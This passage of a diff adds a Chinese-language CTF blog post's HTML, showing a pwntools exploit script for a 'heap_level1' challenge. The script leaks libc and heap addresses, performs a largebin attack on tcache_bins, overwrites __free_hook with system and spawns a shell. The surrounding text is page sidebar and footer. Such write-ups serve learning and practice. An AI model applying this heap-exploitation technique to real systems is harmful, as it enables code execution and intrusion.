class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-fh&#x27;]</span><br><span class="line">sh = process(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    sh.sendlineafter(&quot;&gt;&gt; &quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def add(size, idx, content):</span><br><span class="line">    menu(1)</span><br><span class="line">    sh.sendlineafter(&quot;HOw much?\n&quot;, str(size))</span><br><span class="line">    sh.sendlineafter(&quot;which?\n&quot;, str(idx))</span><br><span class="line">    sh.sendafter(&quot;Content:\n&quot;, content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    sh.sendlineafter(&quot;which one?\n&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    sh.sendlineafter(&quot;which one?\n&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    menu(4)</span><br><span class="line">    sh.sendlineafter(&quot;which one?\n&quot;, str(idx))</span><br><span class="line">    sh.sendafter(&quot;content:\n&quot;, content)</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    menu(6)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">add(0x500, 0, &#x27;a&#x27;)</span><br><span class="line">add(0x520, 1, &#x27;a&#x27;)</span><br><span class="line">add(0x510, 2, &#x27;a&#x27;)</span><br><span class="line">add(0x530, 3, &#x27;a&#x27;)</span><br><span class="line">add(0x420, 4, &#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">libc.address = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;)) - 96 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;libc: &quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">heap = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;)) - 0x290</span><br><span class="line">print(&quot;heap: &quot;, hex(heap))</span><br><span class="line"></span><br><span class="line">__free_hook = libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">mp_ = libc.address + 0x1ec280</span><br><span class="line">tcache_bins = mp_ + 80</span><br><span class="line">print(hex(tcache_bins))</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x500, 5, &#x27;a&#x27;)</span><br><span class="line">add(0x540, 6, &#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload = p64(libc.address + 0x1ed010)*2 + p64(heap + 0xcd0) + p64(tcache_bins - 0x20)</span><br><span class="line">edit(2,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># debug()</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">add(0x540,7,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">edit(7,p64(__free_hook))</span><br><span class="line">add(0x540,8,p64(system))</span><br><span class="line">add(0x540,9,p64(system))</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># -PWN</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/09/open-getdent64-write/" rel="prev" title="open getdent64 write">
+      <i class="fa fa-chevron-left"></i> open getdent64 write
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#heap-level1"><span class="nav-number">1.</span> <span class="nav-text">heap_level1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#leak-libc-amp-heap-address"><span class="nav-number">1.2.1.</span> <span class="nav-text">leak libc &amp; heap address</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#search-function-address"><span class="nav-number">1.2.2.</span> <span class="nav-text">search function address</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#mp-%E5%92%8Ctcache-bins"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">mp_和tcache__bins</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#largebin-attack"><span class="nav-number">1.2.3.</span> <span class="nav-text">largebin attack</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-1"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E4%B8%80%E4%B8%8B%EF%BC%9A"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">调试一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#tidx%E7%9A%84%E8%AE%A1%E7%AE%97"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">tidx的计算</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#tcache%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.4.</span> <span class="nav-text">tcache下的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E4%B8%80%E4%B8%8B%EF%BC%9A-1"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">调试一下：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-free-hook"><span class="nav-number">1.2.5.</span> <span class="nav-text">劫持__free_hook</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#system-%E2%80%98-x2F-bin-x2F-sh%E2%80%99"><span class="nav-number">1.2.6.</span> <span class="nav-text">system(‘&#x2F;bin&#x2F;sh’)</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="hhhhhh_"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">hhhhhh_</p>
+  <div class="site-description" itemprop="description">想去北方看看</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hhhhhh_</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
